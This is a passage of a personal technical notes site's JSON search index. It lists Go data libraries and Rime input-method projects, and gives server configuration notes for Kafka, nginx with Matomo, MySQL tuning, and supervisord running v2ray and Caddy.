rel=\"noopener\"\u003ehttps://www.elastic.co/guide/en/elasticsearch/reference/7.14/fix-common-cluster-issues.html#circuit-breaker-errors\u003c/a\u003e\u003c/p\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Elasticsearch Notes"},{"categories":null,"contents":" Data ML https://github.com/sjwhitworth/golearn https://github.com/gorse-io/gorse https://github.com/gorgonia/gorgonia https://github.com/cdipaolo/goml https://github.com/galeone/tfgo data https://github.com/gonum/gonum https://github.com/gonum/plot https://github.com/vdobler/chart https://github.com/rocketlaunchr/dataframe-go https://github.com/cpmech/gosl https://github.com/montanaflynn/stats https://github.com/nytlabs/streamtools ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/libraries/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eData\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003eML\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/sjwhitworth/golearn\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/sjwhitworth/golearn\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gorse-io/gorse\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gorse-io/gorse\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gorgonia/gorgonia\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gorgonia/gorgonia\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/cdipaolo/goml\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/cdipaolo/goml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/galeone/tfgo\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/galeone/tfgo\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003edata\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gonum/gonum\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gonum/gonum\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gonum/plot\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gonum/plot\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vdobler/chart\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/vdobler/chart\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rocketlaunchr/dataframe-go\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/rocketlaunchr/dataframe-go\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/cpmech/gosl\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/cpmech/gosl\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/montanaflynn/stats\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/montanaflynn/stats\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/nytlabs/streamtools\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/nytlabs/streamtools\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Go Libraries"},{"categories":null,"contents":" 類別 名稱 說明 PC weasel 小狼毫 適用於 Windows 係統的開源輸入法 PC squirrel 鼠須管 適用於 macOS 的開源輸入法 PC ibus-rime 適用於 Linux 係統的開源輸入法 PC openvanilla 專門針對 macOS 開發的開源輸入法 Mobile fcitx5-android 適用於 Android 係統的開源輸入法，從 Fcitx 5 移植而來。 Mobile trime 同文 適用於 Android 係統的開源輸入法，給予 rime 開發而來。 Mobile YuyanIme 雨燕 適用於 Android 係統的開源輸入法，基於 rime 定製開發。 Mobile Hamster 適用於 iOS 係統的開源輸入法，基於 rime 定製開發。 拚音 rime-ice 霧凇拚音，目前知名度最廣的拚音方案之一 拚音 rime-frost 白霜詞庫，基於霧凇拚音進行詞頻調整的拚音方案 拚音 oh-my-rime 薄荷拚音，基於霧凇拚音進行調整的輕量級拚音方案 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/input-method/","summary":"\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e類別\u003c/th\u003e\n          \u003cth\u003e名稱\u003c/th\u003e\n          \u003cth\u003e說明\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/rime/weasel\" target=\"_blank\" rel=\"noopener\"\u003eweasel 小狼毫\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Windows 係統的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/rime/squirrel\" target=\"_blank\" rel=\"noopener\"\u003esquirrel 鼠須管\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 macOS 的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/rime/ibus-rime\" target=\"_blank\" rel=\"noopener\"\u003eibus-rime\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Linux 係統的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/openvanilla/openvanilla/\" target=\"_blank\" rel=\"noopener\"\u003eopenvanilla\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e專門針對 macOS 開發的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/fcitx5-android/fcitx5-android\" target=\"_blank\" rel=\"noopener\"\u003efcitx5-android\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Android 係統的開源輸入法，從 Fcitx 5 移植而來。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/osfans/trime\" target=\"_blank\" rel=\"noopener\"\u003etrime 同文\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Android 係統的開源輸入法，給予 rime 開發而來。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/gurecn/YuyanIme\" target=\"_blank\" rel=\"noopener\"\u003eYuyanIme 雨燕\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Android 係統的開源輸入法，基於 rime 定製開發。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/imfuxiao/Hamster\" target=\"_blank\" rel=\"noopener\"\u003eHamster\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 iOS 係統的開源輸入法，基於 rime 定製開發。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e拚音\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/iDvel/rime-ice\" target=\"_blank\" rel=\"noopener\"\u003erime-ice\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e霧凇拚音，目前知名度最廣的拚音方案之一\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e拚音\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/gaboolic/rime-frost\" target=\"_blank\" rel=\"noopener\"\u003erime-frost\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e白霜詞庫，基於霧凇拚音進行詞頻調整的拚音方案\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e拚音\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/Mintimate/oh-my-rime\" target=\"_blank\" rel=\"noopener\"\u003eoh-my-rime\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e薄荷拚音，基於霧凇拚音進行調整的輕量級拚音方案\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":null,"title":"Input-Method Notes"},{"categories":null,"contents":" Kafka consumer.properties max.partition.fetch.bytes=104857600 server.properties socket.send.buffer.bytes=1048576000 socket.receive.buffer.bytes=1048576000 log.retention.bytes=-1 group.initial.rebalance.delay.ms=0 max.message.bytes=1048576000 fetch.message.max.bytes=1048576000 replica.fetch.max.bytes=1048576000 socket.request.max.bytes=1048576000 # 单个索引文件最大 10 MB log.index.size.max.bytes=10485760 # 日志段大小 512 MB（根据需要再调小） log.segment.bytes=536870912 # 避免過多 client 連進來撐爆 broker max.connections=50000 max.connections.per.ip=20000 # 逾時 connections.max.idle.ms=300000 request.timeout.ms=60000 # —— 高并发优化配置 —— # 若需要更高吞吐、能接受更高的调度开销 # num.network.threads=2 # 网络线程数 → CPU 核心数 # num.io.threads=4 # I/O 线程数 → 核心数×2 # 一般num.network.threads主要处理网络io，读写缓冲区数据，基本没有io等待，配置线程数量为cpu核数加1 # num.io.threads主要进行磁盘io操作，高峰期可能有些io等待，因此配置需要大些。配置线程数量为cpu核数2倍，最大不超过3倍. Matomo nginx.conf user www-data; worker_processes auto; pid /run/nginx.pid; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 768; # multi_accept on; } http { ## # Basic Settings ## sendfile on; tcp_nopush on; types_hash_max_size 2048; server_tokens off; # 同時調高打開的檔案數 open_file_cache max=1000 inactive=20s; open_file_cache_valid 30s; open_file_cache_min_uses 2; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_min_length 1024; gzip_comp_level 5; gzip_proxied any; gzip_types text/plain text/css application/javascript application/json image/svg+xml; # 全域 expires 規則 expires 1d; add_header Cache-Control \u0026#34;public\u0026#34;; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } matomo.conf server { listen 80; server_name analytics.matomo.cc; root /var/www/html/matomo; index index.php index.html; access_log /var/log/nginx/matomo.access.log; error_log /var/log/nginx/matomo.error.log warn; location / { try_files $uri $uri/ =404; } # Matomo Rewrite for pretty URLs location ~ ^/(index|piwik|matomo)\\.php(/|$) { fastcgi_split_path_info ^(.+\\.php)(/.*)$; fastcgi_pass unix:/run/php/php8.1-fpm.sock; include fastcgi_params; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param HTTPS off; # 緩衝區 fastcgi_buffers 16 16k; fastcgi_buffer_size 32k; fastcgi_busy_buffers_size 64k; fastcgi_temp_file_write_size 64k; # 逾時 fastcgi_read_timeout 300; fastcgi_connect_timeout 60; fastcgi_send_timeout 60; # 加速 HEAD 請求 fastcgi_ignore_headers X-Accel-Buffering; } # 靜態檔案快取 location ~* \\.(js|woff2?|ttf|css|png|jpg|jpeg|gif|ico|svg)$ { expires max; access_log off; log_not_found off; } # 安全：拒絕存取 .ht* location ~ /\\.ht { deny all; } } crontab */5 * * * * php /var/www/html/matomo/console core:archive --force-all-websites \u0026gt; /var/log/matomo-archive.log 2\u0026gt;\u0026amp;1 MySQL # 臨時表大小 - 可以設定更大 tmp_table_size = 2147483648 # 2GB (約記憶體的3-4%) max_heap_table_size = 2147483648 # 2GB (必須與 tmp_table_size 相同) # 排序緩衝區 - 每個連線獨立使用 sort_buffer_size = 4194304 # 4MB (不要太大，會佔用過多記憶體) # 讀取緩衝區 read_buffer_size = 2097152 # 2MB (你的設定已經合適) read_rnd_buffer_size = 8388608 # 8MB (可以稍微增大) # 連線緩衝區 join_buffer_size = 8388608 # 8MB bulk_insert_buffer_size = 67108864 # 64MB # InnoDB 相關 innodb_buffer_pool_size = 42949672960 # 40GB (約記憶體的60-65%) innodb_log_file_size = 2147483648 # 2GB innodb_log_buffer_size = 67108864 # 64MB # 設定原則 # tmp_table_size \u0026amp; max_heap_table_size： # 這兩個參數必須相同 # 建議設定為記憶體的 2-4% # 64GB 機器建議 1-2GB # sort_buffer_size： # 每個連線都會分配，不要設太大 # 建議 2-8MB，你的 2MB 其實已經合適 # innodb_buffer_pool_size： # 最重要的參數 # 建議設定為記憶體的 60-70% # 64GB 機器建議 38-42GB # TempTable Storage Engine 參數（MySQL 8.0 關鍵） temptable_max_ram = 4294967296 # 4GB（記憶體中臨時表） temptable_max_mmap = 42949672960 # 40GB（記憶體映射檔案） temptable_use_mmap = 1 # 啟用記憶體映射 v2ray supervisord.conf ; supervisor config file [unix_http_server] file=/var/run/supervisor.sock ; (the path to the socket file) chmod=0700 ; sockef file mode (default 0700) [supervisord] logfile=/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log) pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid) childlogdir=/var/log/supervisor ; (\u0026#39;AUTO\u0026#39; child log dir, default $TEMP) logfileMaxbytes=100MB logfileBackups=50 loglevel=debug ; the below section must remain in the config file for RPC ; (supervisorctl/web interface) to work, additional interfaces may be ; added by defining them in separate rpcinterface: sections [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///var/run/supervisor.sock ; use a unix:// URL for a unix socket ; The [include] section can just contain the \u0026#34;files\u0026#34; setting. This ; setting can list multiple files (separated by whitespace or ; newlines). It can also contain wildcards. The filenames are ; interpreted as relative to this file. Included files *cannot* ; include files themselves. [include] files = /etc/supervisor/conf.d/*.conf conf.d/v2ray.conf [program:v2ray] command = /etc/v2ray/bin/v2ray run -config /etc/v2ray/config.json -confdir /etc/v2ray/conf process_name = v2ray stdout_logfile = /var/log/supervisor/v2ray.log stderr_logfile = /var/log/supervisor/v2ray.log autostart=true startsecs=3 startretries=3 autorestart=true exitcodes=0 stopsignal=TERM stopwaitsecs=10 stopasgroup=true killasgroup=true [program:caddy] command = /usr/local/bin/caddy run --environ --config /etc/caddy/Caddyfile --adapter caddyfile process_name = caddy stdout_logfile = /var/log/supervisor/caddy.log stderr_logfile = /var/log/supervisor/caddy.log autostart=true startsecs=3 startretries=3 autorestart=true exitcodes=0 stopsignal=TERM stopwaitsecs=10 stopasgroup=true killasgroup=true ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/server/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eKafka\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"consumerproperties\"\u003econsumer.properties\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.partition.fetch.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e104857600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"serverproperties\"\u003eserver.properties\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esocket.send.buffer.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esocket.receive.buffer.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog.retention.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003egroup.initial.rebalance.delay.ms\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.message.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efetch.message.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ereplica.fetch.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esocket.request.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 单个索引文件最大 10 MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog.index.size.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10485760\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 日志段大小 512 MB（根据需要再调小）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog.segment.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e536870912\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 避免過多 client 連進來撐爆 broker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.connections\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e50000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.connections.per.ip\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e20000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 逾時\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003econnections.max.idle.ms\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e300000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003erequest.timeout.ms\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e60000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# —— 高并发优化配置 ——\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 若需要更高吞吐、能接受更高的调度开销\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# num.network.threads=2    # 网络线程数 → CPU 核心数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# num.io.threads=4         # I/O 线程数 → 核心数×2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 一般num.network.threads主要处理网络io，读写缓冲区数据，基本没有io等待，配置线程数量为cpu核数加1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# num.io.threads主要进行磁盘io操作，高峰期可能有些io等待，因此配置需要大些。配置线程数量为cpu核数2倍，最大不超过3倍.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMatomo\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"nginxconf\"\u003enginx.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003euser\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewww-data\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_processes\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eauto\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epid\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/run/nginx.pid\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003einclude\u003c/span\u003e /etc/nginx/modules-enabled/*.conf;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eevents\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eworker_connections\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e768\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# multi_accept on;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Basic Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003esendfile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003etcp_nopush\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003etypes_hash_max_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eserver_tokens\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# 同時調高打開的檔案數\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eopen_file_cache\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003emax=1000\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003einactive=20s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan 